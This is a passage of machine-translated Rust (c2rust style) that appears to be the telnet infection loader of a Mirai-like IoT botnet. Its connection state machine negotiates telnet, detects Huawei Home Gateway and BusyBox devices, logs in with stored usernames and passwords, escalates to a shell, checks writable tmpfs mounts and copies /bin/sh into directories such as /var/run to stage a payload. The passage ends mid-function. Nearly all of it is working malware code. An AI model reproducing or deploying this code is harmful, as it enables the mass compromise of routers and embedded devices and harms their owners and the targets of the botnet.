    let mut tmp: libc::c_uint = 0;
    let mut tmp___0: ssize_t = 0;
    if debug_mode != 0 {
        hex_buf[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
        tmp = 1 as libc::c_uint;
        while !(tmp >= 32 as libc::c_uint) {
            hex_buf[tmp as usize] = 0 as libc::c_int as libc::c_char;
            tmp = tmp.wrapping_add(1);
        }
        sprintf(
            hex_buf.as_mut_ptr(),
            b"state %d - send: %d\0" as *const u8 as *const libc::c_char,
            stateTable[sock as usize].state as libc::c_int,
            len,
        );
        hexDump(hex_buf.as_mut_ptr(), buf, len);
    }
    bytes_sent = (::std::ptr::read_volatile::<
        libc::c_uint,
    >(&bytes_sent as *const libc::c_uint))
        .wrapping_add(len as libc::c_uint);
    tmp___0 = send(sock, buf as *const libc::c_void, len as size_t, flags);
    return tmp___0 as libc::c_int;
}
pub unsafe extern "C" fn sockprintf(
    mut sock: libc::c_int,
    mut formatStr: *mut libc::c_char,
    mut args: ...
) -> libc::c_int {
    let mut textBuffer: [libc::c_char; 2048] = [0; 2048];
    let mut tmp: libc::c_uint = 0;
    let mut args_0: ::std::ffi::VaListImpl;
    let mut q: libc::c_int = 0;
    let mut tmp___0: size_t = 0;
    let mut tmp___1: libc::c_int = 0;
    textBuffer[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
    tmp = 1 as libc::c_uint;
    while !(tmp >= 2048 as libc::c_uint) {
        textBuffer[tmp as usize] = 0 as libc::c_int as libc::c_char;
        tmp = tmp.wrapping_add(1);
    }
    memset(
        textBuffer.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        2048 as libc::c_int as size_t,
    );
    args_0 = args.clone();
    vsprintf(
        textBuffer.as_mut_ptr(),
        formatStr as *const libc::c_char,
        args_0.as_va_list(),
    );
    tmp___0 = strlen(textBuffer.as_mut_ptr() as *const libc::c_char);
    tmp___1 = log_send(
        sock,
        textBuffer.as_mut_ptr() as *mut libc::c_void,
        tmp___0 as libc::c_int,
        16384 as libc::c_int,
    );
    q = tmp___1;
    return q;
}
pub unsafe extern "C" fn memmem(
    mut l: *const libc::c_void,
    mut l_len: libc::c_ulong,
    mut s: *const libc::c_void,
    mut s_len: libc::c_ulong,
) -> *mut libc::c_void {
    let mut cur: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut last: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut cl: *const libc::c_char = 0 as *const libc::c_char;
    let mut cs: *const libc::c_char = 0 as *const libc::c_char;
    let mut tmp: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___0: libc::c_int = 0;
    cl = l as *const libc::c_char;
    cs = s as *const libc::c_char;
    if l_len == 0 as libc::c_ulong {
        return 0 as *mut libc::c_void
    } else {
        if s_len == 0 as libc::c_ulong {
            return 0 as *mut libc::c_void;
        }
    }
    if l_len < s_len {
        return 0 as *mut libc::c_void;
    }
    if s_len == 1 as libc::c_ulong {
        tmp = memchr(l, *cs as libc::c_int, l_len);
        return tmp;
    }
    last = (cl as *mut libc::c_char).offset(l_len as isize).offset(-(s_len as isize));
    cur = cl as *mut libc::c_char;
    while cur as libc::c_ulong <= last as libc::c_ulong {
        if *cur.offset(0 as libc::c_int as isize) as libc::c_int
            == *cs.offset(0 as libc::c_int as isize) as libc::c_int
        {
            tmp___0 = memcmp(
                cur as *const libc::c_void,
                cs as *const libc::c_void,
                s_len,
            );
            if tmp___0 == 0 as libc::c_int {
                return cur as *mut libc::c_void;
            }
        }
        cur = cur.offset(1);
    }
    return 0 as *mut libc::c_void;
}
pub unsafe extern "C" fn handle_remote_closed(mut fd: libc::c_int) {
    remote_hangup = (::std::ptr::read_volatile::<
        libc::c_ulong,
    >(&remote_hangup as *const libc::c_ulong))
        .wrapping_add(1 as libc::c_int as libc::c_ulong);
}
pub unsafe extern "C" fn handle_timeout(mut fd: libc::c_int) {
    timed_out = (::std::ptr::read_volatile::<
        libc::c_ulong,
    >(&timed_out as *const libc::c_ulong))
        .wrapping_add(1 as libc::c_int as libc::c_ulong);
}
pub unsafe extern "C" fn handle_failed_connect(mut fd: libc::c_int) {
    failed_connect = (::std::ptr::read_volatile::<
        libc::c_ulong,
    >(&failed_connect as *const libc::c_ulong))
        .wrapping_add(1 as libc::c_int as libc::c_ulong);
}
pub unsafe extern "C" fn handle_found(mut fd: libc::c_int) {
    found_srvs = (::std::ptr::read_volatile::<
        libc::c_ulong,
    >(&found_srvs as *const libc::c_ulong))
        .wrapping_add(1 as libc::c_int as libc::c_ulong);
}
pub unsafe extern "C" fn closeAndCleanup(mut fd: libc::c_int) {
    let mut linger: linger = linger { l_onoff: 0, l_linger: 0 };
    if stateTable[fd as usize].slotUsed != 0 {
        if stateTable[fd as usize].fd == fd {
            stateTable[fd as usize].slotUsed = 0 as libc::c_int;
            stateTable[fd as usize].state = 0 as libc::c_int as libc::c_uchar;
            stateTable[fd as usize]
                .path[0 as libc::c_int
                as usize][0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize]
                .path[1 as libc::c_int
                as usize][0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize]
                .path[2 as libc::c_int
                as usize][0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize]
                .path[3 as libc::c_int
                as usize][0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize]
                .path[4 as libc::c_int
                as usize][0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize]
                .username[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize]
                .password[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
            stateTable[fd as usize].echoInd = 0 as libc::c_int as uint16_t;
            stateTable[fd as usize].pathInd = 0 as libc::c_int as uint8_t;
            stateTable[fd as usize].success = 0 as libc::c_int as libc::c_uchar;
            stateTable[fd as usize].special = 0 as libc::c_int as libc::c_uchar;
            stateTable[fd as usize].got_prompt = 0 as libc::c_int as libc::c_uchar;
            if stateTable[fd as usize].is_open != 0 {
                stateTable[fd as usize].is_open = 0 as libc::c_int as libc::c_uchar;
                shutdown(fd, 2 as libc::c_int);
                linger.l_onoff = 1 as libc::c_int;
                linger.l_linger = 0 as libc::c_int;
                setsockopt(
                    fd,
                    1 as libc::c_int,
                    13 as libc::c_int,
                    &mut linger as *mut linger as *mut libc::c_char
                        as *const libc::c_void,
                    ::std::mem::size_of::<linger>() as libc::c_ulong as socklen_t,
                );
                close(fd);
            }
        }
    }
}
pub unsafe extern "C" fn updateAccessTime(mut fd: libc::c_int) {
    let mut tmp: time_t = 0;
    if stateTable[fd as usize].slotUsed != 0 {
        if stateTable[fd as usize].fd == fd {
            tmp = time(0 as *mut libc::c_void as *mut time_t);
            stateTable[fd as usize].updatedAt = tmp as libc::c_int;
        }
    }
}
pub unsafe extern "C" fn getConnectedSockets() -> libc::c_int {
    let mut q: libc::c_int = 0;
    let mut i: libc::c_int = 0;
    q = 0 as libc::c_int;
    i = 0 as libc::c_int;
    q = 0 as libc::c_int;
    while (q as libc::c_uint) < maxFDSaw {
        if stateTable[q as usize].slotUsed != 0 {
            i += 1;
        }
        q += 1;
    }
    return i;
}
pub unsafe extern "C" fn flood(mut par1: *mut libc::c_void) -> *mut libc::c_void {
    let mut current_block: u64;
    let mut buf: [libc::c_uchar; 10241] = [0; 10241];
    let mut tmp: libc::c_uint = 0;
    let mut pevents: [epoll_event; 25] = [epoll_event {
        events: 0,
        data: epoll_data {
            ptr: 0 as *mut libc::c_void,
        },
    }; 25];
    let mut tmp___0: libc::c_uint = 0;
    let mut ret: libc::c_int = 0;
    let mut i: libc::c_int = 0;
    let mut got: libc::c_int = 0;
    let mut ii: libc::c_int = 0;
    let mut state: *mut stateSlot_t = 0 as *mut stateSlot_t;
    let mut is_closed: libc::c_int = 0;
    let mut state___0: *mut stateSlot_t = 0 as *mut stateSlot_t;
    let mut old_state: libc::c_int = 0;
    let mut tmp1: [libc::c_uchar; 3] = [0; 3];
    let mut tmp2: [libc::c_uchar; 9] = [0; 9];
    let mut tmp___1: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___2: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___3: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___4: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___5: libc::c_int = 0;
    let mut tmp___6: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___7: libc::c_int = 0;
    let mut tmp___8: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___9: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___10: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___11: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___12: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___13: libc::c_int = 0;
    let mut tmp___14: libc::c_int = 0;
    let mut tmp___15: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___16: libc::c_int = 0;
    let mut tmp_buf: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut start: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut space: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut memes: libc::c_int = 0;
    let mut tmp___18: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___19: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___20: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut iii: libc::c_int = 0;
    let mut tmp___21: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___22: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___23: size_t = 0;
    let mut tmp___24: libc::c_int = 0;
    let mut tmp___25: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___26: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___27: size_t = 0;
    let mut tmp___28: libc::c_int = 0;
    let mut tmp___29: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___30: uint16_t = 0;
    let mut tmp___31: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___32: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___33: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___34: libc::c_int = 0;
    let mut tmp___35: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___36: libc::c_int = 0;
    let mut event: epoll_event = epoll_event {
        events: 0,
        data: epoll_data {
            ptr: 0 as *mut libc::c_void,
        },
    };
    let mut state___1: *mut stateSlot_t = 0 as *mut stateSlot_t;
    let mut so_error: libc::c_int = 0;
    let mut len: socklen_t = 0;
    let mut tmp___37: *mut libc::c_int = 0 as *mut libc::c_int;
    ::std::intrinsics::atomic_xadd_seqcst(&mut running_threads, 1 as libc::c_int);
    buf[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_uchar;
    tmp = 1 as libc::c_uint;
    while !(tmp >= 10241 as libc::c_uint) {
        buf[tmp as usize] = 0 as libc::c_int as libc::c_uchar;
        tmp = tmp.wrapping_add(1);
    }
    pevents[0 as libc::c_int as usize].events = 0 as libc::c_int as uint32_t;
    pevents[0 as libc::c_int as usize].data.ptr = 0 as *mut libc::c_void;
    tmp___0 = 1 as libc::c_uint;
    while !(tmp___0 >= 25 as libc::c_uint) {
        pevents[tmp___0 as usize].events = 0 as libc::c_uint;
        pevents[tmp___0 as usize].data.ptr = 0 as *mut libc::c_void;
        tmp___0 = tmp___0.wrapping_add(1);
    }
    ret = 0 as libc::c_int;
    i = 0 as libc::c_int;
    got = 0 as libc::c_int;
    ii = 0 as libc::c_int;
    loop {
        ret = epoll_wait(
            epollFD,
            pevents.as_mut_ptr(),
            25 as libc::c_int,
            10000 as libc::c_int,
        );
        if !(ret >= 0 as libc::c_int) {
            if !(ret == -(1 as libc::c_int)) {
                break;
            }
            tmp___37 = __errno_location();
            if !(*tmp___37 == 4 as libc::c_int) {
                break;
            }
        }
        if ret == 0 as libc::c_int {
            continue;
        }
        i = 0 as libc::c_int;
        while i < ret {
            if pevents[i as usize].events & 8 as libc::c_uint != 0 {
                current_block = 10212990495229635068;
            } else if pevents[i as usize].events & 16 as libc::c_uint != 0 {
                current_block = 10212990495229635068;
            } else if pevents[i as usize].events & 8192 as libc::c_uint != 0 {
                current_block = 10212990495229635068;
            } else {
                if pevents[i as usize].events & 1 as libc::c_uint == 0 {
                    if pevents[i as usize].events & 4 as libc::c_uint == 0 {
                        current_block = 10212990495229635068;
                    } else {
                        current_block = 13188094114917870486;
                    }
                } else {
                    current_block = 13188094114917870486;
                }
                match current_block {
                    10212990495229635068 => {}
                    _ => {
                        if pevents[i as usize].events & 1 as libc::c_uint != 0 {
                            is_closed = 0 as libc::c_int;
                            state___0 = &mut *stateTable
                                .as_mut_ptr()
                                .offset(
                                    (*pevents.as_mut_ptr().offset(i as isize)).data.fd as isize,
                                ) as *mut stateSlot_t;
                            memset(
                                buf.as_mut_ptr() as *mut libc::c_void,
                                0 as libc::c_int,
                                10241 as libc::c_int as size_t,
                            );
                            pthread_mutex_lock(&mut (*state___0).mutex);
                            old_state = (*state___0).state as libc::c_int;
                            got = 0 as libc::c_int;
                            let mut current_block_77: u64;
                            loop {
                                if (*state___0).state as libc::c_int == 1 as libc::c_int {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        1 as libc::c_int,
                                        2 as libc::c_int,
                                    );
                                    if got > 0 as libc::c_int {
                                        if buf[0 as libc::c_int as usize] as libc::c_int
                                            == 255 as libc::c_int
                                        {
                                            (*state___0).state = 2 as libc::c_int as libc::c_uchar;
                                        }
                                    }
                                    if got > 0 as libc::c_int {
                                        if buf[0 as libc::c_int as usize] as libc::c_int
                                            != 255 as libc::c_int
                                        {
                                            (*state___0).state = 3 as libc::c_int as libc::c_uchar;
                                        }
                                    }
                                }
                                if (*state___0).state as libc::c_int == 2 as libc::c_int {
                                    log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        1 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr().offset(1 as libc::c_int as isize)
                                            as *mut libc::c_void,
                                        2 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if got > 0 as libc::c_int {
                                        (*state___0).state = 1 as libc::c_int as libc::c_uchar;
                                        if buf[1 as libc::c_int as usize] as libc::c_int
                                            == 253 as libc::c_int
                                        {
                                            if buf[2 as libc::c_int as usize] as libc::c_int
                                                == 31 as libc::c_int
                                            {
                                                tmp1[0 as libc::c_int
                                                    as usize] = 255 as libc::c_int as libc::c_uchar;
                                                tmp1[1 as libc::c_int
                                                    as usize] = 251 as libc::c_int as libc::c_uchar;
                                                tmp1[2 as libc::c_int
                                                    as usize] = 31 as libc::c_int as libc::c_uchar;
                                                log_send(
                                                    (*state___0).fd,
                                                    tmp1.as_mut_ptr() as *mut libc::c_void,
                                                    3 as libc::c_int,
                                                    16384 as libc::c_int,
                                                );
                                                tmp2[0 as libc::c_int
                                                    as usize] = 255 as libc::c_int as libc::c_uchar;
                                                tmp2[1 as libc::c_int
                                                    as usize] = 250 as libc::c_int as libc::c_uchar;
                                                tmp2[2 as libc::c_int
                                                    as usize] = 31 as libc::c_int as libc::c_uchar;
                                                tmp2[3 as libc::c_int
                                                    as usize] = 0 as libc::c_int as libc::c_uchar;
                                                tmp2[4 as libc::c_int
                                                    as usize] = 80 as libc::c_int as libc::c_uchar;
                                                tmp2[5 as libc::c_int
                                                    as usize] = 0 as libc::c_int as libc::c_uchar;
                                                tmp2[6 as libc::c_int
                                                    as usize] = 24 as libc::c_int as libc::c_uchar;
                                                tmp2[7 as libc::c_int
                                                    as usize] = 255 as libc::c_int as libc::c_uchar;
                                                tmp2[8 as libc::c_int
                                                    as usize] = 240 as libc::c_int as libc::c_uchar;
                                                log_send(
                                                    (*state___0).fd,
                                                    tmp2.as_mut_ptr() as *mut libc::c_void,
                                                    9 as libc::c_int,
                                                    16384 as libc::c_int,
                                                );
                                                current_block_77 = 3491679287662957171;
                                            } else {
                                                current_block_77 = 14541395414537699361;
                                            }
                                        } else {
                                            current_block_77 = 14541395414537699361;
                                        }
                                        match current_block_77 {
                                            3491679287662957171 => {}
                                            _ => {
                                                ii = 0 as libc::c_int;
                                                while ii < 3 as libc::c_int {
                                                    if buf[ii as usize] as libc::c_int == 253 as libc::c_int {
                                                        buf[ii as usize] = 252 as libc::c_int as libc::c_uchar;
                                                    } else if buf[ii as usize] as libc::c_int
                                                            == 251 as libc::c_int
                                                        {
                                                        buf[ii as usize] = 253 as libc::c_int as libc::c_uchar;
                                                    }
                                                    ii += 1;
                                                }
                                                log_send(
                                                    (*state___0).fd,
                                                    buf.as_mut_ptr() as *mut libc::c_void,
                                                    3 as libc::c_int,
                                                    16384 as libc::c_int,
                                                );
                                            }
                                        }
                                    }
                                }
                                if !(got > 0 as libc::c_int) {
                                    break;
                                }
                                if !((*state___0).state as libc::c_int != 3 as libc::c_int)
                                {
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 3 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___1 = memmem(
                                        buf.as_mut_ptr() as *const libc::c_void,
                                        got as libc::c_ulong,
                                        b"Huawei Home Gateway\0" as *const u8 as *const libc::c_char
                                            as *const libc::c_void,
                                        19 as libc::c_ulong,
                                    );
                                    if tmp___1 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong
                                    {
                                        (*state___0).special = 1 as libc::c_int as libc::c_uchar;
                                    }
                                    tmp___2 = memmem(
                                        buf.as_mut_ptr() as *const libc::c_void,
                                        got as libc::c_ulong,
                                        b"BusyBox\0" as *const u8 as *const libc::c_char
                                            as *const libc::c_void,
                                        7 as libc::c_ulong,
                                    );
                                    if tmp___2 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong
                                    {
                                        (*state___0).got_prompt = 1 as libc::c_int as libc::c_uchar;
                                        sockprintf(
                                            (*state___0).fd,
                                            b"enable\r\n\0" as *const u8 as *const libc::c_char
                                                as *mut libc::c_char,
                                        );
                                        (*state___0).state = 7 as libc::c_int as libc::c_uchar;
                                        break;
                                    } else {
                                        tmp___3 = memmem(
                                            buf.as_mut_ptr() as *const libc::c_void,
                                            got as libc::c_ulong,
                                            b"ogin\0" as *const u8 as *const libc::c_char
                                                as *const libc::c_void,
                                            4 as libc::c_ulong,
                                        );
                                        if tmp___3 as libc::c_ulong
                                            != 0 as *mut libc::c_void as libc::c_ulong
                                        {
                                            (*state___0).got_prompt = 1 as libc::c_int as libc::c_uchar;
                                            sockprintf(
                                                (*state___0).fd,
                                                b"%s\r\n\0" as *const u8 as *const libc::c_char
                                                    as *mut libc::c_char,
                                                ((*state___0).username).as_mut_ptr(),
                                            );
                                            (*state___0).state = 4 as libc::c_int as libc::c_uchar;
                                            break;
                                        } else {
                                            tmp___4 = memmem(
                                                buf.as_mut_ptr() as *const libc::c_void,
                                                got as libc::c_ulong,
                                                b"sername\0" as *const u8 as *const libc::c_char
                                                    as *const libc::c_void,
                                                7 as libc::c_ulong,
                                            );
                                            if tmp___4 as libc::c_ulong
                                                != 0 as *mut libc::c_void as libc::c_ulong
                                            {
                                                (*state___0).got_prompt = 1 as libc::c_int as libc::c_uchar;
                                                sockprintf(
                                                    (*state___0).fd,
                                                    b"%s\r\n\0" as *const u8 as *const libc::c_char
                                                        as *mut libc::c_char,
                                                    ((*state___0).username).as_mut_ptr(),
                                                );
                                                (*state___0).state = 4 as libc::c_int as libc::c_uchar;
                                                break;
                                            } else {
                                                tmp___5 = matchPrompt(
                                                    buf.as_mut_ptr() as *mut libc::c_char,
                                                );
                                                if !(tmp___5 != 0) {
                                                    continue;
                                                }
                                                (*state___0).got_prompt = 1 as libc::c_int as libc::c_uchar;
                                                sockprintf(
                                                    (*state___0).fd,
                                                    b"%s\r\n\0" as *const u8 as *const libc::c_char
                                                        as *mut libc::c_char,
                                                    ((*state___0).username).as_mut_ptr(),
                                                );
                                                (*state___0).state = 4 as libc::c_int as libc::c_uchar;
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                            if (*state___0).state as libc::c_int == 4 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___6 = memmem(
                                        buf.as_mut_ptr() as *const libc::c_void,
                                        got as libc::c_ulong,
                                        b"assword\0" as *const u8 as *const libc::c_char
                                            as *const libc::c_void,
                                        7 as libc::c_ulong,
                                    );
                                    if tmp___6 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong
                                    {
                                        sockprintf(
                                            (*state___0).fd,
                                            b"%s\r\n\0" as *const u8 as *const libc::c_char
                                                as *mut libc::c_char,
                                            ((*state___0).password).as_mut_ptr(),
                                        );
                                        (*state___0).state = 5 as libc::c_int as libc::c_uchar;
                                        break;
                                    } else {
                                        tmp___7 = matchPrompt(
                                            buf.as_mut_ptr() as *mut libc::c_char,
                                        );
                                        if !(tmp___7 != 0) {
                                            continue;
                                        }
                                        sockprintf(
                                            (*state___0).fd,
                                            b"%s\r\n\0" as *const u8 as *const libc::c_char
                                                as *mut libc::c_char,
                                            ((*state___0).password).as_mut_ptr(),
                                        );
                                        (*state___0).state = 5 as libc::c_int as libc::c_uchar;
                                        break;
                                    }
                                }
                            }
                            if (*state___0).state as libc::c_int == 5 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___8 = strcasestr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"access denied\0" as *const u8 as *const libc::c_char,
                                    );
                                    if tmp___8 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong
                                    {
                                        (*state___0).state = 254 as libc::c_int as libc::c_uchar;
                                        break;
                                    } else {
                                        tmp___9 = strcasestr(
                                            buf.as_mut_ptr() as *const libc::c_char,
                                            b"invalid password\0" as *const u8 as *const libc::c_char,
                                        );
                                        if tmp___9 as libc::c_ulong
                                            != 0 as *mut libc::c_void as libc::c_ulong
                                        {
                                            (*state___0).state = 254 as libc::c_int as libc::c_uchar;
                                            break;
                                        } else {
                                            tmp___10 = strcasestr(
                                                buf.as_mut_ptr() as *const libc::c_char,
                                                b"login incorrect\0" as *const u8 as *const libc::c_char,
                                            );
                                            if tmp___10 as libc::c_ulong
                                                != 0 as *mut libc::c_void as libc::c_ulong
                                            {
                                                (*state___0).state = 254 as libc::c_int as libc::c_uchar;
                                                break;
                                            } else {
                                                tmp___11 = strcasestr(
                                                    buf.as_mut_ptr() as *const libc::c_char,
                                                    b"password is wrong\0" as *const u8 as *const libc::c_char,
                                                );
                                                if tmp___11 as libc::c_ulong
                                                    != 0 as *mut libc::c_void as libc::c_ulong
                                                {
                                                    (*state___0).state = 254 as libc::c_int as libc::c_uchar;
                                                    break;
                                                } else {
                                                    tmp___12 = strcasestr(
                                                        buf.as_mut_ptr() as *const libc::c_char,
                                                        b"BusyBox\0" as *const u8 as *const libc::c_char,
                                                    );
                                                    if tmp___12 as libc::c_ulong
                                                        != 0 as *mut libc::c_void as libc::c_ulong
                                                    {
                                                        sockprintf(
                                                            (*state___0).fd,
                                                            b"enable\r\n\0" as *const u8 as *const libc::c_char
                                                                as *mut libc::c_char,
                                                        );
                                                        (*state___0).state = 6 as libc::c_int as libc::c_uchar;
                                                        break;
                                                    } else {
                                                        tmp___13 = matchPrompt(
                                                            buf.as_mut_ptr() as *mut libc::c_char,
                                                        );
                                                        if !(tmp___13 != 0) {
                                                            continue;
                                                        }
                                                        sockprintf(
                                                            (*state___0).fd,
                                                            b"enable\r\n\0" as *const u8 as *const libc::c_char
                                                                as *mut libc::c_char,
                                                        );
                                                        (*state___0).state = 6 as libc::c_int as libc::c_uchar;
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            if (*state___0).state as libc::c_int == 6 as libc::c_int {
                                got = log_recv(
                                    (*state___0).fd,
                                    buf.as_mut_ptr() as *mut libc::c_void,
                                    10240 as libc::c_int,
                                    0 as libc::c_int,
                                );
                                if got > 0 as libc::c_int {
                                    sockprintf(
                                        (*state___0).fd,
                                        b"shell\r\n\0" as *const u8 as *const libc::c_char
                                            as *mut libc::c_char,
                                    );
                                    (*state___0).state = 7 as libc::c_int as libc::c_uchar;
                                }
                            }
                            if (*state___0).state as libc::c_int == 7 as libc::c_int {
                                got = log_recv(
                                    (*state___0).fd,
                                    buf.as_mut_ptr() as *mut libc::c_void,
                                    10240 as libc::c_int,
                                    0 as libc::c_int,
                                );
                                if got > 0 as libc::c_int {
                                    sockprintf(
                                        (*state___0).fd,
                                        b"sh\r\n\0" as *const u8 as *const libc::c_char
                                            as *mut libc::c_char,
                                    );
                                    if (*state___0).special as libc::c_int == 1 as libc::c_int {
                                        (*state___0).state = 250 as libc::c_int as libc::c_uchar;
                                    } else {
                                        (*state___0).state = 8 as libc::c_int as libc::c_uchar;
                                    }
                                }
                            }
                            if (*state___0).state as libc::c_int == 8 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___14 = matchPrompt(
                                        buf.as_mut_ptr() as *mut libc::c_char,
                                    );
                                    if !(tmp___14 != 0) {
                                        continue;
                                    }
                                    sockprintf(
                                        (*state___0).fd,
                                        b"%s\r\n\0" as *const u8 as *const libc::c_char
                                            as *mut libc::c_char,
                                        b"/bin/busybox VDOSS\0" as *const u8 as *const libc::c_char,
                                    );
                                    (*state___0).state = 9 as libc::c_int as libc::c_uchar;
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 9 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___15 = strcasestr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"applet not found\0" as *const u8 as *const libc::c_char,
                                    );
                                    if !(tmp___15 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong)
                                    {
                                        continue;
                                    }
                                    tmp___16 = matchPrompt(
                                        buf.as_mut_ptr() as *mut libc::c_char,
                                    );
                                    if !(tmp___16 != 0) {
                                        continue;
                                    }
                                    sockprintf(
                                        (*state___0).fd,
                                        b"cat /proc/mounts\r\n\0" as *const u8
                                            as *const libc::c_char as *mut libc::c_char,
                                    );
                                    (*state___0).state = 10 as libc::c_int as libc::c_uchar;
                                    break;
                                }
                            }
                            if (*state___0).state as libc::c_int == 10 as libc::c_int {
                                loop {
                                    got = log_recv(
                                        (*state___0).fd,
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        10240 as libc::c_int,
                                        0 as libc::c_int,
                                    );
                                    if !(got > 0 as libc::c_int) {
                                        break;
                                    }
                                    tmp___25 = strstr(
                                        buf.as_mut_ptr() as *const libc::c_char,
                                        b"tmpfs\0" as *const u8 as *const libc::c_char,
                                    );
                                    if !(tmp___25 as libc::c_ulong
                                        != 0 as *mut libc::c_void as libc::c_ulong)
                                    {
                                        tmp___26 = strstr(
                                            buf.as_mut_ptr() as *const libc::c_char,
                                            b"ramfs\0" as *const u8 as *const libc::c_char,
                                        );
                                        if !(tmp___26 as libc::c_ulong
                                            != 0 as *mut libc::c_void as libc::c_ulong)
                                        {
                                            tmp___24 = matchPrompt(
                                                buf.as_mut_ptr() as *mut libc::c_char,
                                            );
                                            if !(tmp___24 != 0) {
                                                continue;
                                            }
                                            strcpy(
                                                ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                                b"/var/run\0" as *const u8 as *const libc::c_char,
                                            );
                                            sockprintf(
                                                (*state___0).fd,
                                                b"/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n\0"
                                                    as *const u8 as *const libc::c_char as *mut libc::c_char,
                                                ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                                ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                                ((*state___0).path[0 as libc::c_int as usize]).as_mut_ptr(),
                                            );
                                            (*state___0).state = 100 as libc::c_int as libc::c_uchar;
                                            break;
                                        }
                                    }
                                    tmp_buf = buf.as_mut_ptr() as *mut libc::c_char;
                                    start = 0 as *mut libc::c_void as *mut libc::c_char;
                                    space = 0 as *mut libc::c_void as *mut libc::c_char;
                                    memes = 0 as libc::c_int;
                                    let mut current_block_199: u64;
                                    loop {
                                        tmp___20 = strstr(
                                            tmp_buf as *const libc::c_char,
                                            b"tmpfs\0" as *const u8 as *const libc::c_char,
                                        );
                                        if tmp___20 as libc::c_ulong
                                            != 0 as *mut libc::c_void as libc::c_ulong
                                        {
                                            tmp___18 = strstr(
